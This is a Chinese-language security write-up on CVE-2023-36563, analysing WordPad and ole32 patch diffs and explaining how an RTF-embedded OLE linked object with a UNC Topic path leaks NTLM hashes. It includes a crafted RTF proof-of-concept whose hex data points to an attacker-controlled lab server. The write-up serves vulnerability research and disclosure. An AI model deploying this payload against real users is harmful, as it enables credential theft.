
# CVE-2023-36563 wordpad 信息泄露漏洞简要分析

## 基本信息

wordpad在解析rtf文件包含的ole对象时会尝试访问Linked object的Topic指向的文件，如果Topic是一个UNC路径则会尝试通过网络访问，并尝试使用NTLM认证，导致泄露NTLM hash。

## 影响版本

略

## 环境搭建

- windows 10 21h2 2023-09补丁

## 技术分析&调试

初次看这个漏洞，直觉上很类似今年4月份的在野利用漏洞CVE-2023-23397 outlook 权限提升漏洞，都是泄露NTLM hash，该漏洞也可能是在某种文件的某个属性使用了UNC路径，使得wordpad加载远程资源，造成NTLM hash泄露。

### 补丁diff

diff `wordpad.exe`，可以看到修改了如下函数

![](upload/attach/202311/914504_PVCKHGNCQ79NHP5.webp)

同时在修复后的`wordpad.exe`中新增了`QueryConvertOLELinkCallback`函数和`_LoadImageWithWIC_0`，根据微软的函数命名规则，`QueryConvertOLELinkCallback`可能用于查询并转换OLE链接回调函数，比较符合我们的猜测。

![](upload/attach/202311/914504_8CHWXZ5WD8YQ3YK.webp)

附上AI解释

![](upload/attach/202311/914504_TWWGSVTZ5YBP34X.webp)

对比各个修改后的函数，可以看出`LoadImageResource`为加载Image的资源节里面的资源，不是很符合我们之前的假设

![](upload/attach/202311/914504_3WEF8GNMV7ZUH6S.webp)

回到补丁新增的函数中，对于新增的函数`QueryConvertOLELineCallback`，其在`CRichEdit2View::OnCreate`函数中调用，在diff中可以看到补丁中将该函数作为回调函数指针传递给了`SendMessageW`，目标窗口可以取出这个回调函数指针并调用

![](upload/attach/202311/914504_G9TT78WVZYMMFXW.webp)

![](upload/attach/202311/914504_XCATJPT5U7EKXZA.webp)

分析到这可以猜测是wordpad打开OLE对象时，将某个属性作为UNC路径进行了解析并访问，导致NTLM hash泄露。

ole对象相关功能由`ole32.dll`实现，diff `ole32.dll`，主要修改了如下函数

- `OLESTREAMToGenericObject`
- `wConvertOLESTREAMToIStorage`
- `OleConvertOLESTREAMToIStorage`
- `OleConvertOLESTREAMToIStorageEx`

![](upload/attach/202311/914504_URAUVUPVES54YYN.webp)

新增了如下函数

- `IsAppExcludedFromOLELinkConversionRegistrySetting`
- `CheckOLELinkConversionRegistrySetting`
- `FindStringInMultiString`
- `OleConvertOLESTREAMToIStorage2`
- `OleConvertOLESTREAMToIStorageEx2`

![](upload/attach/202311/914504_PPGBUV6WFF27S6M.webp)

在`OLESTREAMToGenericObject`函数diff中可以看到调用了wordpad中传递的函数指针`QueryConvertOLELineCallback`，并使用`PrependUNCName`将`szUNC`添加UNC路径后赋给`a2->m_szTopic`。

![](upload/attach/202311/914504_5EPNWQMEX7YKNK3.webp)

因此可以得出结论：该漏洞是将ole对象的`m_szTopic`作为UNC路径进行访问。

谷歌搜索`OLESTREAMToGenericObject`，在其他安全研究员发表的<a href="elink@343K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1K9g2)9J5k6i4q4A6j5h3&6^5K9h3&6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6U0N6X3g2Q4x3X3b7J5x3o6p5%4i4K6u0V1x3e0p5^5z5o6u0Q4x3X3c8W2P5s2m8D9L8$3W2@1i4K6u0V1K9$3W2@1i4K6u0V1M7$3q4E0M7r3I4W2i4K6u0r3">其他ole漏洞分析</a>中看到了如下

![](upload/attach/202311/914504_HEHJSRGY37YQWP2.webp)

OLE格式可以在<a href="elink@0acK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4K9h3&6H3M7X3!0@1L8$3y4G2L8r3c8G2j5#2)9J5k6h3u0D9L8$3u0Q4x3X3g2U0L8%4u0W2i4K6u0W2N6$3W2F1k6r3!0%4M7#2)9J5k6h3&6W2N6q4)9J5c8Y4m8J5L8$3c8#2j5%4c8A6L8$3&6%4K9h3&6V1L8%4N6K6j5i4u0U0K9r3W2$3k6i4y4Q4x3V1k6y4f1#2)9J5k6p5!0x3c8f1c8e0i4K6u0r3i4K6t1#2y4h3u0y4f1#2)9J5k6p5!0x3c8f1c8e0i4K6t1#2y4h3c8Q4x3X3g2H3k6r3j5`.">OLD微软官方文档</a>中看到，FormatID标识了ole对象类型，根据之前的分析可以知道是LinkedObject导致了该漏洞的产生。

![](upload/attach/202311/914504_BWGG22MT3SRM9ZF.webp)

根据<a href="elink@a3aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9k6h3q4J5L8W2)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4)9J5k6h3y4G2L8g2)9J5c8X3g2F1i4K6u0V1N6i4y4Q4x3V1k6G2M7r3g2F1M7%4m8W2j5%4y4Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6g2X3M7s2u0G2N6r3!0U0L8$3I4K6i4K6u0r3L8i4y4Q4x3X3c8G2L8r3g2V1M7#2)9J5c8X3y4W2y4e0j5#2j5U0j5^5i4K6u0V1x3e0l9I4k6q4)9J5k6o6c8S2k6U0y4Q4x3X3b7^5z5r3k6S2i4K6u0V1x3K6W2U0x3U0S2V1y4K6W2X3j5K6p5I4i4K6t1K6k6%4c8Q4y4h3k6U0k6X3x3@1y4h3f1%4y4W2)9J5k6o6V1J5x3e0W2Q4x3X3b7@1j5K6b7%4i4K6u0V1z5h3g2X3x3W2)9J5k6o6f1^5x3K6u0S2x3e0M7J5k6U0M7&6y4b7`.`.">微软文档</a>，LinkedObject是单独的源文件中的对象。如果源文件中的对象发生更改，则文档中的对象将自动更新以反映这些更改。

> **linked object**: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.

通过wordpad创建一个rtf文件并嵌入ole对象，使用编辑器打开可以看到如下，根据文档可知该ole对象类型为EmbedObject

```
{\rtf1\ansi\ansicpg54936\deff0\nouicompat\deflang1033\deflangfe2052{\fonttbl{\f0\fnil\fcharset134 \'cb\'ce\'cc\'e5;}}
{\\*\generator Riched20 10.0.19041}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang2052 fff{\object\objemb{\\*\objclass PBrush}\objw2835\objh2835{\\*\objdata
01050000
02000000
07000000
50427275736800
00000000
00000000
a0a30100
424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000
000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

下载<a href="elink@1efK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6h3y4S2L8r3q4Y4k6e0u0Q4x3V1k6G2L8r3g2@1L8$3!0D9M7H3`.`.">ole tools</a>，查看wordpad生成的rtf文件信息

```
➜ rtfobj.exe .\test.rtf
rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
File: '.\\test.rtf' - size: 661865 bytes
---+----------+---------------------------------------------------------------
id |index |OLE Object
---+----------+---------------------------------------------------------------
0 |00000118h |format_id: 2 (Embedded)
| |class name: b'PBrush'
| |data size: 107424
| |MD5 = '6eb1e875d3759af5e4b65cd324182471'
---+----------+---------------------------------------------------------------
```

我们知道Topic属性是触发漏洞的关键，通过查看ole文档找到了关键信息，如果LinkedObject包含了ObjectHeader结构，则TopicName必须包含指向链接的文件路径，这个路径必须是绝对路径或者是UNC路径

![](upload/attach/202311/914504_EF629Y9RDC9VGYJ.webp)

所以我们可以将UNC路径设置为我们的恶意服务器，重新构造rtf文件，成功触发

```
{\rtf1\ansi\ansicpg54936\deff0\nouicompat\deflang1033\deflangfe2052{\fonttbl{\f0\fnil\fcharset134 \'cb\'ce\'cc\'e5;}}
{\\*\generator Riched20 10.0.19041}{\\*\mmathPr\mdispDef1\mwrapIndent1440 }\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang2052{\object\objemb{\\*\objclass Word.Document.8}\objw585\objh795{\\*\objdata
01050000
01000000
10000000
576f72642e446f63756d656e742e3800
17000000
5c5c3139322e3136382e35322e3135365c312e72746600
00000000
00000000
00000000
00000000
01050000
05000000
10000000
576f72642e446f63756d656e742e3800
0e000000
74400000
0100090000033a20000009001610000000001610000026060f002220574d464301000000000001
```

![](upload/attach/202311/914504_DBCF372EC8GTD3N.webp)

![](upload/attach/202311/914504_NWWAD7QHDXGV7KA.webp)

注意到即使设置了MotW，虽然wordpad会显示警告，但仍然会访问Topic指向的资源，在procmonitor中可以看到如下事件

![](upload/attach/202311/914504_CX4EERFCKZYKAHP.webp)

### 补丁和缓解措施分析

微软在补丁日后发布了<a href="elink@244K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6i4m8H3L8%4u0@1i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4c8G2M7r3W2U0i4K6u0r3K9$3t1#2x3o6x3J5x3K6p5@1i4K6u0V1K9r3!0%4i4K6u0V1N6r3!0Q4x3X3c8E0j5h3&6S2k6$3g2Q4x3X3c8@1K9r3g2Q4x3X3c8G2L8r3g2Q4x3X3c8G2j5X3A6W2j5%4c8Q4x3X3c8U0L8$3&6$3k6i4u0K6K9h3!0F1i4K6u0V1N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5g2)9J5k6r3q4K6M7$3!0U0K9h3q4@1k6h3c8Q4x3X3c8%4K9i4c8Z5i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9J5x3#2)9J5k6o6x3$3y4e0j5K6i4K6u0V1z5e0S2V1z5e0g2S2k6e0W2Q4x3X3b7J5k6U0W2W2i4K6u0V1y4r3j5$3y4g2)9J5k6o6V1J5x3K6q4Q4x3X3b7@1y4U0x3$3x3$3x3K6x3h3y4X3x3o6M7`.">一篇文章</a>，指出可以在 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\OLELinkConversionFromOLESTREAMToIStorage`中添加DWORD的Disabled值0x00000001来禁用，但我在win 10 21h2 9月补丁中应用了此方法，但不起作用，wordpad没有读取这个注册表。打开文件后仍然访问了UNC路径，泄露了NTLM hash

在前文补丁分析中已知，wordpad会传递回调函数给ole32一个回调函数，在ole32中，会先检查注册表是否禁用了ole对象链接转换，而后检查当前进程是否在白名单内，最后而后调用用户提供的回调函数，以运行用户自定义的规则。

### PoC构造

打开wordpad，插入一个rtf对象，而后将Topic的长度和name字段替换为UNC路径即可，稍晚俩天poc会公布在我的GitHub

```
https://github.com/Chestnuts4/POC
```

## 小结
